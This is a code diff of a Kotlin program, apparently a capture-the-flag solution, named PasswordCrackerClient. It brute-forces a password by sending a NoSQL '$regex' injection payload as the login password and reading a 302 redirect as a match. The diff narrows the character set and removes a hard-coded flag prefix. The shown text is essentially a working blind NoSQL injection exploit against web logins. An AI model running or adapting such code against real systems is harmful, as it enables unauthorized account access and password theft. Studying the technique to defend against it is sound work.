@@ -7,11 +7,12 @@ import java.net.http.HttpRequest.BodyPublishers
 import java.net.http.HttpResponse.BodyHandlers
 import java.time.Duration
 
-private val CHARS: List<Char> = ('0'..'9') + ('a'..'z') + ('A'..'Z') + '-' + '_'
+private val CHARS: List<Char> = ('0'..'9') + ('a'..'z') + ('A'..'Z') + '_'
 
 fun main() {
     val username = "null"
-    val passwordTemplate = """{"${'$'}regex": "^N0SQL_injections_are_[X].*${'$'}"}"""
+
+    val passwordTemplate = """{"${'$'}regex": "^[X].*${'$'}"}"""
     val passwordChars = mutableListOf<Char>()
 
     for (i in (0..32)) {
@@ -54,5 +55,4 @@ object PasswordCrackerClient {
 
         return response.statusCode() == 302
     }
-
 }
